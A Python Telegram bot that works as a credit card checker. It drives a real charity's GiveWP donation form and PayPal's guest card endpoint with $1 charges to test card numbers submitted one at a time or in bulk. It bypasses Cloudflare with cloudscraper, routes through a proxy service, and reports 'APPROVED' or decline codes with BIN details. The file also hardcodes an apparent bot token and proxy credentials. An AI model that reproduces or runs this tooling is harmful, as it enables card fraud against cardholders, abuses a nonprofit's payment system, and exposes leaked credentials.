# -*- coding: utf-8 -*-
import cloudscraper
import random
import string
import os
import telebot
import time
import sys
import requests
from telebot import types

# Fix console encoding for Windows
if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8')

BOT_TOKEN = "8457573508:AAHTXv1eMFpZhK7cYj54CGBIeBCZTS-K1og"
CHAT_ID = "8114477669"

bot = telebot.TeleBot(BOT_TOKEN)

name = 'john wills'
address = "1830 E Parks Hwy"
city = 'Wasilla'
postal_code='99654'
state = 'OR'

proxies = {
    "http": "http://brd-customer-hl_4200bd7a-zone-datacenter_proxy1:x98d5ul2oxob@brd.superproxy.io:33335",
    "https": "http://brd-customer-hl_4200bd7a-zone-datacenter_proxy1:x98d5ul2oxob@brd.superproxy.io:33335"
}

USE_PROXY = False  # Set to True to use proxy, False to bypass
DEBUG_MODE = True  # Set to True to see raw responses


def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

chars = string.ascii_lowercase + string.digits
username = ''.join(random.choice(chars) for _ in range(10))
email = username + "@gmail.com"

# Local BIN database for common ranges
BIN_DATABASE = {
    '532839': {'brand': 'MASTERCARD', 'type': 'CREDIT', 'bank': 'CAPITAL ONE', 'country': 'UNITED STATES', 'emoji': '🇺🇸'},
    '531258': {'brand': 'MASTERCARD', 'type': 'DEBIT', 'bank': 'BANK OF AMERICA', 'country': 'UNITED STATES', 'emoji': '🇺🇸'},
    '424631': {'brand': 'VISA', 'type': 'CREDIT', 'bank': 'CHASE', 'country': 'UNITED STATES', 'emoji': '🇺🇸'},
    '411111': {'brand': 'VISA', 'type': 'CREDIT', 'bank': 'VISA TEST CARD', 'country': 'UNITED STATES', 'emoji': '🇺🇸'},
    '540510': {'brand': 'MASTERCARD', 'type': 'CREDIT', 'bank': 'WELLS FARGO', 'country': 'UNITED STATES', 'emoji': '🇺🇸'},
    '471674': {'brand': 'VISA', 'type': 'DEBIT', 'bank': 'REGIONS BANK', 'country': 'UNITED STATES', 'emoji': '🇺🇸'},
}

def get_bin_info(bin_number):
    # Check local database first
    if bin_number in BIN_DATABASE:
        return BIN_DATABASE[bin_number]
    
    # Try multiple BIN lookup APIs
    
    # Try API 1: binlist.io (free, no key needed)
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        response = requests.get(f'https://binlist.io/lookup/{bin_number}/', headers=headers, timeout=3)
        if response.status_code == 200:
            data = response.json()
            return {
                'brand': data.get('scheme', 'UNKNOWN').upper(),
                'type': data.get('type', 'UNKNOWN').upper(),
                'bank': data.get('bank', {}).get('name', 'UNKNOWN'),
                'country': data.get('country', {}).get('name', 'UNKNOWN'),
                'emoji': data.get('country', {}).get('emoji', '🌍')
            }
    except:
        pass
    
    # Try API 2: binlist.net
    try:
        response = requests.get(f'https://lookup.binlist.net/{bin_number}', timeout=3)
        if response.status_code == 200:
            data = response.json()
            return {
                'brand': data.get('scheme', 'UNKNOWN').upper(),
                'type': data.get('type', 'UNKNOWN').upper(),
                'bank': data.get('bank', {}).get('name', 'UNKNOWN'),
                'country': data.get('country', {}).get('name', 'UNKNOWN'),
                'emoji': data.get('country', {}).get('emoji', '🌍')
            }
    except:
        pass
    
    # Fallback: Basic card type detection from BIN
    card_brand = 'UNKNOWN'
    card_type = 'CREDIT'
    
    first_digit = bin_number[0]
    if first_digit == '4':
        card_brand = 'VISA'
    elif first_digit == '5':
        card_brand = 'MASTERCARD'
        # Mastercard debit ranges
        if bin_number[:2] in ['51', '52', '53', '54', '55']:
            card_type = 'CREDIT'
    elif first_digit == '3':
        if bin_number[:2] in ['34', '37']:
            card_brand = 'AMEX'
        else:
            card_brand = 'DINERS'
    elif first_digit == '6':
        if bin_number[:4] == '6011':
            card_brand = 'DISCOVER'
        else:
            card_brand = 'MAESTRO'
    
    return {
        'brand': card_brand,
        'type': card_type,
        'bank': 'UNKNOWN',
        'country': 'UNITED STATES',
        'emoji': '🇺🇸'
    }




def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

muid = f"{generate_random_string(8)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(12)}"
guid = generate_random_string(32)
sid = generate_random_string(32)

def paypal(cc, mm, yy, cvv, username_tg="User"):
    # Track start time
    start_time = time.time()
    
    # Use cloudscraper to bypass Cloudflare
    session = cloudscraper.create_scraper(
        browser={
            'browser': 'chrome',
            'platform': 'windows',
            'mobile': False
        }
    )
    if USE_PROXY:
        session.proxies = proxies
    


    url = 'travelforimpact.com'


    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en,en-US;q=0.9,ar;q=0.8,es;q=0.7,he;q=0.6,fr;q=0.5,it;q=0.4,ja;q=0.3,nl;q=0.2,de;q=0.1,zh-TW;q=0.1,zh;q=0.1,tr;q=0.1,hu;q=0.1,pt-BR;q=0.1,pt;q=0.1,sl;q=0.1,el;q=0.1,zh-CN;q=0.1,fa;q=0.1',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36',
    }

    response = session.get(f'https://travelforimpact.com/donate', headers=headers)

    # Check for Cloudflare or other blocks
    if 'cloudflare' in response.text.lower() or 'cf-ray' in response.text.lower():
        return "[ﾒ] Card ➜ " + cc + "|" + mm + "|" + yy + "|" + cvv + "\n[ﾒ] Status ➜ Gateway Error ⚠️\n[ﾒ] Response ➜ Site blocked by Cloudflare - Gateway Down\n[ﾒ] Gateway ➜ PayPal 1$ CVV 3\n━━━━━━━━━━━\n[ﾒ] Note ➜ travelforimpact.com is blocking automated requests\n━━━━━━━━━━━\n[ﾒ] Checked By ➜ " + username_tg + " [PREMIUM]", "GATEWAY_ERROR"
    
    form_id = gets(response.text,'post_type=give_forms&#038;p=',"'")
    if form_id is None:
        if DEBUG_MODE:
            print ("[ERROR] Cannot find form_id")
            print(response.text[:500])
        return "[ﾒ] Card ➜ " + cc + "|" + mm + "|" + yy + "|" + cvv + "\n[ﾒ] Status ➜ Gateway Error ⚠️\n[ﾒ] Response ➜ Cannot access donation form\n[ﾒ] Gateway ➜ PayPal 1$ CVV 3\n━━━━━━━━━━━\n[ﾒ] Note ➜ Site may be down or changed\n━━━━━━━━━━━\n[ﾒ] Checked By ➜ " + username_tg + " [PREMIUM]", "GATEWAY_ERROR"



    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en,en-US;q=0.9,ar;q=0.8,es;q=0.7,he;q=0.6,fr;q=0.5,it;q=0.4,ja;q=0.3,nl;q=0.2,de;q=0.1,zh-TW;q=0.1,zh;q=0.1,tr;q=0.1,hu;q=0.1,pt-BR;q=0.1,pt;q=0.1,sl;q=0.1,el;q=0.1,zh-CN;q=0.1,fa;q=0.1',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://travelforimpact.com/donate/',
        'sec-fetch-dest': 'iframe',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36',
    }

    params = {
        'givewp-route': 'donation-form-view',
        'form-id': form_id,
        'locale': 'en_US',
    }

    response = session.get('https://travelforimpact.com/', params=params, headers=headers)

    
    nonce = gets(response.text,'"donationFormNonce":"','",')
    if nonce is None:
        print(response.text)
        print(2)
        exit()





    headers = {
        'accept': '*/*',
        'accept-language': 'en,en-US;q=0.9,ar;q=0.8,es;q=0.7,he;q=0.6,fr;q=0.5,it;q=0.4,ja;q=0.3,nl;q=0.2,de;q=0.1,zh-TW;q=0.1,zh;q=0.1,tr;q=0.1,hu;q=0.1,pt-BR;q=0.1,pt;q=0.1,sl;q=0.1,el;q=0.1,zh-CN;q=0.1,fa;q=0.1,sk;q=0.1,bg;q=0.1,ro;q=0.1,lv;q=0.1,lt;q=0.1,id;q=0.1,ru;q=0.1,sv;q=0.1,uk;q=0.1',
        'cache-control': 'no-cache',
        'origin': 'https://travelforimpact.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://travelforimpact.com/?givewp-route=donation-form-view&form-id=8792&locale=en_GB',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36',
    }

    params = {
        'action': 'give_paypal_commerce_create_order',
    }

    files = {
        'give-form-id': (None, '8792'),
        'give-form-hash': (None, nonce),
        'give_payment_mode': (None, 'paypal-commerce'),
        'give-amount': (None, '1'),
        'give-recurring-period': (None, 'undefined'),
        'period': (None, 'undefined'),
        'frequency': (None, 'undefined'),
        'times': (None, 'undefined'),
        'give_first': (None, name),
        'give_last': (None, city),
        'give_email': (None, email),
        'give-cs-form-currency': (None, 'USD'),
    }

    response = session.post(
        'https://travelforimpact.com/wp-admin/admin-ajax.php',
        params=params,
        headers=headers,
        files=files,
    )
    
    id = gets(response.text,'ata":{"id":"','"}')
    if id is None:
        print (response.text)
        print(3)
        exit()






    headers = {
        'accept': '*/*',
        'accept-language': 'en,en-US;q=0.9,ar;q=0.8,es;q=0.7,he;q=0.6,fr;q=0.5,it;q=0.4,ja;q=0.3,nl;q=0.2,de;q=0.1,zh-TW;q=0.1,zh;q=0.1,tr;q=0.1,hu;q=0.1,pt-BR;q=0.1,pt;q=0.1,sl;q=0.1,el;q=0.1,zh-CN;q=0.1,fa;q=0.1,sk;q=0.1,bg;q=0.1,ro;q=0.1,lv;q=0.1,lt;q=0.1,id;q=0.1,ru;q=0.1,sv;q=0.1,uk;q=0.1',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://www.paypal.com',
        'paypal-client-context': id,
        'paypal-client-metadata-id': id,
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-storage-access': 'active',
        'user-agent': 'Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36',
        'x-app-name': 'standardcardfields',
        'x-country': 'US',
    }

    json_data = {
        'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
        'variables': {
            'token': id,
            'card': {
                'cardNumber': cc,
                'type': 'VISA',
                'expirationDate': f'{mm}/{yy}',
                'postalCode': postal_code,
                'securityCode': cvv,
            },
            'phoneNumber': '4459578565',
            'firstName': name,
            'lastName': city,
            'billingAddress': {
                'givenName': name,
                'familyName': city,
                'line1': address,
                'line2': None,
                'city': city,
                'state': state,
                'postalCode': postal_code,
                'country': 'US',
            },
            'shippingAddress': {
                'givenName': name,
                'familyName': city,
                'line1': address,
                'line2': None,
                'city': city,
                'state': state,
                'postalCode': postal_code,
                'country': 'US',
            },
            'email': email,
            'currencyConversionType': 'PAYPAL',
        },
        'operationName': None,
    }

    response = session.post(
        'https://www.paypal.com/graphql?fetch_credit_form_submit',
        headers=headers,
        json=json_data,
    )   

    # Debug mode - print raw response
    if DEBUG_MODE:
        print(f"\n=== DEBUG: Raw Response ===")
        print(response.text[:3000])
        print("===========================\n")

    # Try to parse different response patterns
    result_code = gets(response.text,'"code":"','"')
    result_message = gets(response.text,'"message":"','"')
    
    # Check for success indicators
    if 'approveGuestPaymentWithCreditCard' in response.text and '"cart"' in response.text and 'error' not in response.text.lower():
        status = "Charged 🔥"
        response_msg = "Your payment successful 🎉"
        result = "APPROVED"
    elif result_code:
        # Parse error codes with actual messages
        error_messages = {
            'CARD_GENERIC_ERROR': 'Card Declined',
            'INVALID_BILLING_ADDRESS': 'Invalid Billing Address',
            'CARD_DECLINED': 'Card Declined by Bank',
            'INSUFFICIENT_FUNDS': 'Insufficient Funds',
            'INVALID_CVV': 'Invalid CVV Code',
            'EXPIRED_CARD': 'Card Expired',
            'CARD_TYPE_NOT_SUPPORTED': 'Card Type Not Supported',
            'PROCESSING_ERROR': 'Processing Error',
            'RISK_DECLINED': 'Risk Declined',
            'PAYER_CANNOT_PAY': 'Card Cannot Be Used',
            'INSTRUMENT_DECLINED': 'Card Declined',
            'UNPROCESSABLE_ENTITY': 'Card Cannot Be Processed',
            'INVALID_REQUEST': 'Invalid Card Data',
        }
        
        status = "Declined ❌"
        # Show both code and message if available
        if result_message and result_message != result_code:
            response_msg = f"{error_messages.get(result_code, result_code)} - {result_message}"
        else:
            response_msg = error_messages.get(result_code, result_code)
        result = result_code
    else:
        # Check for other errors in response
        if 'error' in response.text.lower():
            status = "Error ⚠️"
            response_msg = result_message if result_message else "Gateway Error"
            result = "ERROR"
        else:
            status = "Unknown ❓"
            response_msg = "Unable to process - Check gateway"
            result = "UNKNOWN"
    
    bin_info = get_bin_info(cc[:6])
    
    # Calculate time taken
    time_taken = round(time.time() - start_time, 2)
    
    # Format message like Momo Ayase
    if "Charged" in status or "🔥" in status:
        message = f"""APPROVED ✅

Card: {cc}|{mm}|{yy}|{cvv}
Status: {response_msg}
Gateway: PayPal 1$

Information:
├ Card Type: {bin_info['brand']} - {bin_info['type']} - INFINITE
├ Bank: {bin_info['bank']}
├ Country: {bin_info['country']} {bin_info['emoji']}

Time Taken ➜ {time_taken}s
Proxies ➜ {'brd.superproxy.io:33335' if USE_PROXY else 'Disabled'}

Checked By ➜ {username_tg} [PREMIUM]"""
    elif "Declined" in status or "❌" in status:
        message = f"""DECLINED ❌

CC ➜ {cc}|{mm}|{yy}|{cvv}
Gateway ➜ PayPal 1$
Response ➜ {response_msg}

BIN Info: {bin_info['brand']} - {bin_info['type']} - PREMIUM
Bank: {bin_info['bank']}
Country: {bin_info['country']} {bin_info['emoji']}

Time Taken ➜ {time_taken}s"""
    else:
        message = f"""Card: {cc}|{mm}|{yy}|{cvv}
Status: {response_msg}
Gateway: PayPal 1$

BIN Info: {bin_info['brand']} - {bin_info['type']} - PREMIUM
Bank: {bin_info['bank']}
Country: {bin_info['country']} {bin_info['emoji']}

Checked By ➜ {username_tg} [PREMIUM]"""
    
    return message, result


def test_proxy():
    try:
        test_session = requests.Session()
        test_session.proxies = proxies
        response = test_session.get('https://api.ipify.org?format=json', timeout=10)
        if response.status_code == 200:
            ip_data = response.json()
            return True, ip_data.get('ip', 'Unknown')
        return False, 'Connection failed'
    except Exception as e:
        return False, str(e)

@bot.message_handler(commands=['start'])
def start(message):
    proxy_status = "ON ✅" if USE_PROXY else "OFF ❌"
    welcome = f"""🚀 **Hello and welcome!**

Here are the available command categories.

**Paypal 1$**
/ph ⇾ Check a single CC.
/psh ⇾ Check multiple CCs from text.

**Bot Management**
/proxy ⇾ Test proxy connection
/proxyon ⇾ Enable proxy
/proxyoff ⇾ Disable proxy
/debug ⇾ Toggle debug mode

🔧 **Proxy Status:** {proxy_status}

💎 **Status:** Premium Access (1500 CCs)

**Example:**
/ph 5328398894253287|11|2027|756"""
    bot.reply_to(message, welcome, parse_mode='Markdown')

@bot.message_handler(commands=['proxy'])
def check_proxy(message):
    try:
        checking_msg = bot.reply_to(message, "⏳ Testing proxy connection...")
        
        is_working, result = test_proxy()
        
        proxy_status = "ON ✅" if USE_PROXY else "OFF ❌"
        
        if is_working:
            proxy_msg = f"""✅ Proxy Status: ALIVE

🌐 Proxy IP: {result}
🔗 Endpoint: brd.superproxy.io:33335
⚡ Status: Connected
🔧 Usage: {proxy_status}

💡 Use /proxyon or /proxyoff to toggle"""
        else:
            proxy_msg = f"""❌ Proxy Status: DEAD

⚠️ Error: {result}
🔗 Endpoint: brd.superproxy.io:33335
⚡ Status: Failed
🔧 Usage: {proxy_status}

💡 Use /proxyon or /proxyoff to toggle"""
        
        bot.edit_message_text(proxy_msg, message.chat.id, checking_msg.message_id)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error testing proxy: {str(e)}")

@bot.message_handler(commands=['proxyon'])
def proxy_on(message):
    global USE_PROXY
    USE_PROXY = True
    bot.reply_to(message, "✅ Proxy enabled! All requests will use proxy.")

@bot.message_handler(commands=['proxyoff'])
def proxy_off(message):
    global USE_PROXY
    USE_PROXY = False
    bot.reply_to(message, "⚠️ Proxy disabled! Using direct connection.")

@bot.message_handler(commands=['debug'])
def toggle_debug(message):
    global DEBUG_MODE
    DEBUG_MODE = not DEBUG_MODE
    status = "ON ✅" if DEBUG_MODE else "OFF ❌"
    bot.reply_to(message, f"🐛 Debug Mode: {status}\n\nRaw responses will be printed to console.")

@bot.message_handler(commands=['ph'])
def check_single(message):
    try:
        username_tg = message.from_user.first_name or "User"
        cmd_parts = message.text.split(maxsplit=1)
        
        if len(cmd_parts) < 2:
            bot.reply_to(message, "❌ Usage: /ph cc|mm|yy|cvv")
            return
        
        card_data = cmd_parts[1].strip().split('|')
        
        if len(card_data) != 4:
            bot.reply_to(message, "❌ Invalid format. Use: cc|mm|yy|cvv")
            return
        
        cc, mm, yy, cvv = card_data
        
        processing_msg = bot.reply_to(message, "⏳ Processing your card...")
        
        result_msg, result_code = paypal(cc, mm, yy, cvv, username_tg)
        
        bot.edit_message_text(result_msg, message.chat.id, processing_msg.message_id)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['psh'])
def check_mass(message):
    msg = bot.reply_to(message, "📤 Send your cards in format:\ncc|mm|yy|cvv (one per line)")
    bot.register_next_step_handler(msg, process_mass_check)

def process_mass_check(message):
    try:
        username_tg = message.from_user.first_name or "User"
        cards = message.text.strip().split('\n')
        
        if not cards:
            bot.reply_to(message, "❌ No cards provided")
            return
        
        processing_msg = bot.reply_to(message, f"⏳ Processing {len(cards)} cards...")
        
        for idx, card_line in enumerate(cards, 1):
            card_data = card_line.strip().split('|')
            
            if len(card_data) != 4:
                continue
            
            cc, mm, yy, cvv = card_data
            
            result_msg, result_code = paypal(cc, mm, yy, cvv, username_tg)
            
            bot.send_message(message.chat.id, result_msg)
            
            if idx < len(cards):
                time.sleep(2)
        
        bot.send_message(message.chat.id, f"✅ Completed checking {len(cards)} cards")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

if __name__ == "__main__":
    print("Bot started...")
    bot.infinity_polling()


